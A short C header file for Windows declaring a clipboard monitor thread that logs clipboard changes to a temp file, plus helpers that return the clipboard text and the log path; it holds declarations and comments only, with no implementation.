#ifndef CLIPBOARD_H
#define CLIPBOARD_H

#include <windows.h>

/**
 * Clipboard monitor thread function
 * Monitors clipboard for changes and logs to temp file
 * @param param Unused parameter (for thread compatibility)
 * @return Thread exit code
 */
DWORD WINAPI clipboard_monitor(LPVOID param);

/**
 * Get current clipboard text contents
 * @return Dynamically allocated string with clipboard contents (caller must free)
 *         Returns empty string if clipboard is empty or doesn't contain text
 */
char* get_clipboard_contents(void);

/**
 * Get path to clipboard log file
 * @return Dynamically allocated path string (caller must free)
 */
char* get_clipboard_logpath(void);

#endif // CLIPBOARD_H
